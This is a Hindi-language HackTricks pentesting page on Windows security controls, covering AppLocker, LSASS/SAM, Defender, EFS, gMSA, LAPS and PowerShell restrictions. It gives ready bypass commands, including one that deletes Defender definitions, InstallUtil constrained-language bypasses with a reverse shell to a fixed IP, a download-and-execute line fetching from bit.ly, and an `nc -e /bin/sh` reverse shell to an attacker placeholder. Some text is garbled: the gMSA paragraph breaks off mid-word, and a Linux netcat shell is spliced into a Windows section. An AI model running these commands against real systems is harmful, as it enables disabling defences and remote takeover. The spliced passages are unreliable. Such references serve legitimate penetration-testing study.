# Windows सुरक्षा नियंत्रण

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की आवश्यकता है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFT संग्रह**](https://opensea.io/collection/the-peass-family)
* [**आधिकारिक PEASS और HackTricks swag**](https://peass.creator-spring.com) प्राप्त करें
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में **शामिल हों** या मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)** का पालन करें**.
* **अपने हैकिंग ट्रिक्स को** [**hacktricks रेपो**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud रेपो**](https://github.com/carlospolop/hacktricks-cloud) **में PR जमा करके साझा करें**।

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) का उपयोग करें और आसानी से वर्कफ़्लो बनाएं और संचालित करें, जो दुनिया के **सबसे उन्नत समुदाय उपकरणों** द्वारा संचालित होते हैं।\
आज ही पहुंच प्राप्त करें:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## AppLocker नीति

एक एप्लिकेशन व्हाइटलिस्ट एक अनुमोदित सॉफ़्टवेयर एप्लिकेशन या एक्ज़ीक्यूटेबल्स की सूची होती है जो एक सिस्टम पर मौजूद और चलाने की अनुमति देती है। उद्देश्य यह है कि वातावरण को हानिकारक मैलवेयर और अनुमोदित सॉफ़्टवेयर से सुरक्षित रखा जाए जो संगठन की विशेष व्यापार आवश्यकताओं के साथ मेल नहीं खाता है।

[AppLocker](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/what-is-applocker) माइक्रोसॉफ्ट का **एप्लिकेशन व्हाइटलिस्टिंग समाधान** है और सिस्टम प्रशासकों को **उपयोगकर्ताओं को कौन सी एप्लिकेशन और फ़ाइलें चला सकते हैं** पर नियंत्रण प्रदान करता है। यह एक्ज़ीक्यूटेबल्स, स्क्रिप्ट, Windows स्थापक फ़ाइलें, DLLs, पैकेज़ किए गए ऐप्स और पैकेज़ किए गए ऐप्स स्थापकों पर **सूक्ष्म नियंत्रण** प्रदान करता है।\
संगठनों के लिए सामान्य है कि **cmd.exe और PowerShell.exe** और कुछ निर्दिष्ट निर्देशिकाओं के लिए लेखक उपयोग को रोकें, **लेकिन इसे सभी बाईपास किया जा सकता है**।

### जांचें

जांचें कि कौन सी फ़ाइलें/एक्सटेंशन ब्लैकलिस्ट/व्हाइटलिस्ट की गई हैं:
```powershell
Get-ApplockerPolicy -Effective -xml

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

$a = Get-ApplockerPolicy -effective
$a.rulecollections
```
एक होस्ट पर लागू एपलॉकर नियम भी **स्थानीय रजिस्ट्री से पढ़े जा सकते हैं** जो **`HKLM\Software\Policies\Microsoft\Windows\SrpV2`** पर स्थित होते हैं।

### बाईपास

* एपलॉकर नीति को बाईपास करने के लिए उपयोगी **लिखने योग्य फ़ोल्डर**: यदि एपलॉकर को `C:\Windows\System32` या `C:\Windows` के अंदर कुछ भी निष्पादित करने की अनुमति दी जा रही है, तो आप इसे बाईपास करने के लिए **लिखने योग्य फ़ोल्डर** का उपयोग कर सकते हैं।
```
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\Tasks
C:\windows\tracing
```
* सामान्य रूप से **विश्वसनीय** [**"LOLBAS's"**](https://lolbas-project.github.io/) बाइनरी भी AppLocker को दौरा करने के लिए उपयोगी हो सकती हैं।
* **बुरी तरह से लिखी गई नियमों को भी दौरा किया जा सकता है**
* उदाहरण के लिए, **`<FilePathCondition Path="%OSDRIVE%*\allowed*"/>`**, आप कहीं भी एक **`allowed`** नामक फ़ोल्डर बना सकते हैं और उसे अनुमति दी जाएगी।
* संगठन अक्सर **`%System32%\WindowsPowerShell\v1.0\powershell.exe` एक्सीक्यूटेबल को ब्लॉक करने** पर ध्यान केंद्रित करते हैं, लेकिन वे **अन्य** [**PowerShell एक्सीक्यूटेबल स्थान**](https://www.powershelladmin.com/wiki/PowerShell\_Executables\_File\_System\_Locations) जैसे `%SystemRoot%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe` या `PowerShell_ISE.exe` के बारे में भूल जाते हैं।
* **DLL प्रवर्तन बहुत ही कम बार चालू होता है** क्योंकि इससे सिस्टम पर अतिरिक्त भार आ सकता है, और सुनिश्चित करने के लिए आवश्यक परीक्षण की मात्रा। इसलिए **DLL को बैकडोर के रूप में उपयोग करने से AppLocker को दौरा करने में मदद मिलेगी**।
* आप [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) या [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) का उपयोग करके किसी भी प्रक्रिया में **Powershell को निष्पादित** कर सकते हैं और AppLocker को दौरा कर सकते हैं। अधिक जानकारी के लिए देखें: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## प्रमाणीकरण संग्रहण

### सुरक्षा खाता प्रबंधक (SAM)

स्थानीय प्रमाणीकरण इस फ़ाइल में मौजूद होते हैं, पासवर्ड हैश किए जाते हैं।

### स्थानीय सुरक्षा प्राधिकरण (LSA) - LSASS

**प्रमाणीकरण** (हैश किए गए) इस सबसिस्टम की **मेमोरी** में **सहेजे जाते हैं** एकल साइन-ऑन कारणों के लिए।\
**LSA** स्थानीय **सुरक्षा नीति** (पासवर्ड नीति, उपयोगकर्ता अनुमतियाँ...) का प्रशासन करता है, **प्रमाणीकरण**, **पहुँच टोकन**...\
LSA ही वह होगा जो **SAM** फ़ाइल में प्रदान किए गए प्रमाणीकरण की जांच करेगा (स्थानीय लॉगिन के लिए) और डोमेन उपयोगकर्ता की प्रमाणिति के लिए **डोमेन नियंत्रक** के साथ बातचीत करेगा।

**प्रमाणीकरण** **प्रक्रिया LSASS** में सहेजे जाते हैं: Kerberos टिकट, NT और LM हैश, आसानी से डिक्रिप्ट किए जा सकने वाले पासवर्ड।

### LSA गुप्त

LSA डिस्क में कुछ प्रमाणीकरण सहेज सकता है:

* सक्रिय निर्देशिका के कंप्यूटर खाते का पासवर्ड (अप्राप्य डोमेन नियंत्रक)।
* विंडोज सेवाओं के खातों के पासवर्ड
* निर्धारित कार्यों के लिए पासवर्ड
* अधिक (IIS अनुप्रयोगों का पासवर्ड...)

### NTDS.dit

यह एक्टिव डायरेक्टरी का डेटाबेस है। यह केवल डोमेन नियंत्रकों में मौजूद होता है।

## रक्षक

[**माइक्रोसॉफ्ट रक्षक**](https://en.wikipedia.org/wiki/Microsoft\_Defender) विंडोज 10 और विंडोज 11 में उपलब्ध एक एंटीवायरस है, और विंडोज सर्वर के संस्करणों में भी है। यह **`WinPEAS`** जैसे सामान्य पेंटेस्टिंग उपकरणों को **ब्लॉक** करता है। हालांकि, इन सुरक्षा को दौरा करने के तरीके हैं।

### जांच

रक्षक की **स्थिति** की जांच करने के लिए आप PS cmdlet **`Get-MpComputerStatus`** को निष्पादित कर सकते हैं (जानने के लिए **`RealTimeProtectionEnabled`** के मान की जांच करें कि क्या यह सक्रिय है):

<pre class="language-powershell"><code class="lang-powershell">PS C:\> Get-MpComputerStatus

[...]
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 12/6/2021 10:14:23 AM
AntispywareSignatureVersion     : 1.323.392.0
AntivirusEnabled                : True
[...]
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
[...]
<strong>RealTimeProtectionEnabled       : True
</strong>RealTimeScanDirection           : 0
PSComputerName                  :
</code></pre>

इसे जांचने के लिए आप यह भी चला सकते हैं:
```bash
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
wmic /namespace:\\root\securitycenter2 path antivirusproduct
sc query windefend

#Delete all rules of Defender (useful for machines without internet access)
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```
## EFS (एन्क्रिप्टेड फ़ाइल सिस्टम)

EFS एक फ़ाइल को बल्क **सममिति कुंजी** द्वारा एन्क्रिप्ट करके काम करता है, जिसे फ़ाइल एन्क्रिप्शन कुंजी या **FEK** के रूप में भी जाना जाता है। FEK फिर एक **सार्वजनिक कुंजी** के साथ **एन्क्रिप्ट** किया जाता है जो फ़ाइल को एन्क्रिप्ट करने वाले उपयोगकर्ता से जुड़ी होती है, और इस एन्क्रिप्टेड FEK को एन्क्रिप्टेड फ़ाइल के $EFS **वैकल्पिक डेटा स्ट्रीम** में संग्रहीत किया जाता है। फ़ाइल को डिक्रिप्ट करने के लिए, EFS कंपोनेंट ड्राइवर $EFS स्ट्रीम में संग्रहीत सममिति कुंजी को डिक्रिप्ट करने के लिए EFS डिजिटल प्रमाणपत्र (फ़ाइल को एन्क्रिप्ट करने के लिए उपयोग किया जाता है) के साथ मेल खाती प्रमाणपत्र का उपयोग करता है। [यहां से](https://en.wikipedia.org/wiki/Encrypting\_File\_System)।

इस तरह के उदाहरण:

* फ़ाइलें और फ़ोल्डर FAT32 जैसे दूसरे फ़ाइल सिस्टम के साथ फॉर्मेट किए गए वॉल्यूम पर कॉपी होने से पहले डिक्रिप्ट की जाती हैं, जैसे [FAT32](https://en.wikipedia.org/wiki/File\_Allocation\_Table)।
* एन्क्रिप्टेड फ़ाइलें SMB/CIFS प्रोटोकॉल का उपयोग करके नेटवर्क के माध्यम से कॉपी की जाती हैं, फ़ाइलें नेटवर्क पर भेजने से पहले डिक्रिप्ट की जाती हैं।

इस तरीके से एन्क्रिप्टेड फ़ाइलें **मालिक उपयोगकर्ता द्वारा पारदर्शी रूप से एक्सेस की जा सकती हैं** (जिन्होंने उन्हें एन्क्रिप्ट किया है), इसलिए अगर आप उस उपयोगकर्ता के रूप में बन सकते हैं तो आप फ़ाइलें डिक्रिप्ट कर सकते हैं (उपयोगकर्ता के पासवर्ड को बदलने और उसके रूप में लॉगिन करने से काम नहीं चलेगा)।

### EFS जानकारी की जांच

जांचें कि क्या एक **उपयोगकर्ता** ने **इस सेवा का उपयोग किया** है, इस पथ की जांच करके: `C:\users\<username>\appdata\roaming\Microsoft\Protect`

साइफर /c \<file>\ का उपयोग करके फ़ाइल के **पहुंच** वाले **उपयोगकर्ता** की जांच करें।
आप एक फ़ोल्डर में `cipher /e` और `cipher /d` का उपयोग करके सभी फ़ाइलों को **एन्क्रिप्ट** और **डिक्रिप्ट** कर सकते हैं।

### EFS फ़ाइलें डिक्रिप्ट करना

#### Authority System होना

इस तरीके में **पीड़ित उपयोगकर्ता** को **होस्ट** में **चल रहे** एक **प्रक्रिया** की आवश्यकता होती है। यदि ऐसा है, तो `meterpreter` सत्र का उपयोग करके आप प्रक्रिया के उपयोगकर्ता के टोकन का अनुकरण कर सकते हैं (`incognito` के `impersonate_token` से)। या आप सीधे उपयोगकर्ता की प्रक्रिया में `migrate` कर सकते हैं।

#### उपयोगकर्ता के पासवर्ड को जानना

{% embed url="https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files" %}

## समूह प्रबंधित सेवा खाता (gMSA)

अधिकांश इंफ्रास्ट्रक्चर में, सेवा खाते "पासवर्ड कभी नहीं समाप्त होता" विकल्प के साथ आम उपयोगकर्ता खाते होते हैं। इन खातों का रखरखाव एक वास्तविक मुसीबत हो सकता है और इसीलिए माइक्रोसॉफ्ट ने **प्रबंधित सेवा खाते** पेश किए हैं:

* पासवर्ड प्रबंधन नहीं। इसमें एक जटिल, यादृच्छिक, 240-वर्णकार पासवर्ड का उपयोग किया जाता है और जब यह डोमेन या कंप्यूटर पासवर्ड समाप्ति तिथि तक पहुंचता है, तो यह स्वचालित रूप से बदल जाता है।
* इसका उपयोग करने के लिए माइक्रोसॉफ्ट की कुंजी वितरण सेवा (KDC) का उपयोग किया जाता है जो gMSA के लिए पासवर्ड बनाने और प्रबंधित करने के लिए होती है।
* यह लॉक नहीं हो सकता और इंटरैक्टिव लॉगिन के लिए उपयोग नहीं किया जा सकता है
* कई होस्टों के बीच साझा करने का समर्थन करता है
* शेड्यूल कार्यों को चलाने के लिए उपयोग किया जा सकता है (प्रबंधित सेवा खाते शेड्यूल कार्यों को चलाने का समर्थन नहीं करते हैं)
* सरलीकृत SPN प्रबंधन - यदि कंप्यूटर के sAMaccount विवरण या DNS नाम गुण परिवर्तित होते हैं तो सिस्टम स्वचालित रूप से SPN मान को बदल देगा।

gMSA खातों के पासवर्ड एक LDAP गुण के रूप में संग्रहीत होते हैं जिसे _**msDS-ManagedPassword**_ कहा जाता है जो DC के द्वारा हर 30 दिन में स्वचालित रूप से रीसेट होते हैं, **अधिकृत प्रशासकों** और **सर्वरों** द्वारा प्राप्त किए जा सकते हैं जिन पर वे स
```
/GMSAPasswordReader --AccountName jkohler
```
इस [वेब पेज](https://cube0x0.github.io/Relaying-for-gMSA/) की जांच करें जो बताती है कि **NTLM रिले हमला** कैसे करें और **gMSA** के **पासवर्ड** को **पढ़ें**।

## LAPS

\*\*\*\*[**Local Administrator Password Solution (LAPS)**](https://www.microsoft.com/en-us/download/details.aspx?id=46899) आपको डोमेन-जुडिंड कंप्यूटरों पर **स्थानीय व्यवस्थापक पासवर्ड** (जो **यादृच्छिक**, अद्वितीय और **नियमित रूप से बदलता है**) का प्रबंधन करने की अनुमति देता है। ये पासवर्ड सेंट्रली संग्रहीत होते हैं और ACLs का उपयोग करके अधिकृत उपयोगकर्ताओं को प्रतिबंधित किया जाता है। यदि आपको पर्याप्त अनुमतियाँ दी जाती हैं तो आप स्थानीय व्यवस्थापकों के पासवर्ड पढ़ सकते हैं।

{% content-ref url="active-directory-methodology/laps.md" %}
[laps.md](active-directory-methodology/laps.md)
{% endcontent-ref %}

## PS Constrained Language Mode

PowerShell \*\*\*\* [**Constrained Language Mode**](https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/) **बहुत सारी सुविधाओं को बंद कर देता है** जो PowerShell को प्रभावी तरीके से उपयोग करने के लिए आवश्यक होती हैं, जैसे COM ऑब्जेक्ट्स को अवरुद्ध करना, स्वीकृत .NET प्रकारों को ही अनुमति देना, XAML-आधारित वर्कफ़्लो, PowerShell कक्षाएं, और अधिक।

### **जांच करें**
```powershell
$ExecutionContext.SessionState.LanguageMode
#Values could be: FullLanguage or ConstrainedLanguage
```
### बाईपास
```powershell
#Easy bypass
Powershell -version 2
```
वर्तमान Windows में यह Bypass काम नहीं करेगा, लेकिन आप [**PSByPassCLM**](https://github.com/padovah4ck/PSByPassCLM) का उपयोग कर सकते हैं।\
**इसे कंपाइल करने के लिए आपको** **एक संदर्भ जोड़ने की आवश्यकता हो सकती है** -> _ब्राउज़_ -> _ब्राउज़_ -> `C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0\31bf3856ad364e35\System.Management.Automation.dll` जोड़ें और **परियोजना को .Net4.5 में बदलें**।

#### सीधा Bypass:
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U c:\temp\psby.exe
```
#### रिवर्स शेल:

```bash
nc -e /bin/sh <attacker_ip> <attacker_port>
```

यहां `<attacker_ip>` और `<attacker_port>` को आपके आक्रमक का IP पता और पोर्ट संख्या से बदलें।
```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /revshell=true /rhost=10.10.13.206 /rport=443 /U c:\temp\psby.exe
```
आप [**ReflectivePick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) या [**SharpPick**](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerPick) का उपयोग कर सकते हैं ताकि आप किसी भी प्रक्रिया में **Powershell** कोड को निषिद्ध मोड को छोड़कर चला सकें। अधिक जानकारी के लिए देखें: [https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode](https://hunter2.gitbook.io/darthsidious/defense-evasion/bypassing-applocker-and-powershell-contstrained-language-mode).

## PS Execution Policy

इसे डिफ़ॉल्ट रूप से **restricted** पर सेट किया जाता है। इस नीति को छोड़ने के प्रमुख तरीके:
```powershell
1º Just copy and paste inside the interactive PS console
2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```
अधिक जानकारी [यहाँ](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/) मिल सकती है।

## सुरक्षा समर्थन प्रदाता इंटरफेस (SSPI)

यह एपीआई उपयोगकर्ताओं को प्रमाणित करने के लिए उपयोग किया जा सकता है।

SSPI उन दो मशीनों के लिए उपयुक्त प्रोटोकॉल खोजने के लिए जिम्मेदार होगा जो संवाद करना चाहते हैं। इसके लिए प्राथमिक विधि के रूप में केरबेरोस होता है। फिर SSPI यह निर्धारित करेगा कि कौन सा प्रमाणीकरण प्रोटोकॉल उपयोग किया जाएगा, इन प्रमाणीकरण प्रोटोकॉल को सुरक्षा समर्थन प्रदाता (SSP) कहा जाता है, इन्हें प्रत्येक Windows मशीन के भीतर एक DLL के रूप में स्थानांतरित किया जाता है और दोनों मशीनों को समर्थन करना चाहिए ताकि संवाद संभव हो सके।

### मुख्य SSPs

* **केरबेरोस**: प्राथमिकता वाला
* %windir%\Windows\System32\kerberos.dll
* **NTLMv1** और **NTLMv2**: संगतता कारणों के लिए
* %windir%\Windows\System32\msv1\_0.dll
* **Digest**: वेब सर्वर और LDAP, MD5 हैश के रूप में पासवर्ड
* %windir%\Windows\System32\Wdigest.dll
* **Schannel**: SSL और TLS
* %windir%\Windows\System32\Schannel.dll
* **Negotiate**: इसका उपयोग प्रोटोकॉल की वार्ता करने के लिए किया जाता है (केरबेरोस या NTLM, केरबेरोस डिफ़ॉल्ट होता है)
* %windir%\Windows\System32\lsasrv.dll

#### वार्ता में कई विधियाँ या केवल एक प्रदान की जा सकती हैं।

## UAC - उपयोगकर्ता खाता नियंत्रण

[उपयोगकर्ता खाता नियंत्रण (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) एक सुविधा है जो **उच्चतम गतिविधियों के लिए सहमति प्रदान करती है**।

{% content-ref url="windows-security-controls/uac-user-account-control.md" %}
[uac-user-account-control.md](windows-security-controls/uac-user-account-control.md)
{% endcontent-ref %}

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) का उपयोग करके आसानी से वर्कफ़्लो बनाएं और **स्वचालित करें**, जो दुनिया के **सबसे उन्नत** सामुदायिक उपकरणों द्वारा संचालित होते हैं।\
आज ही पहुंच प्राप्त करें:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप चाहते हैं कि आपकी **कंपनी HackTricks में विज्ञापित** की जाए? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की अनुमति चाहिए? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह
* प्राप्त करें [**आधिकारिक PEASS और HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें, PRs सबमिट करके** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को डाउनलोड करें।**

</details>
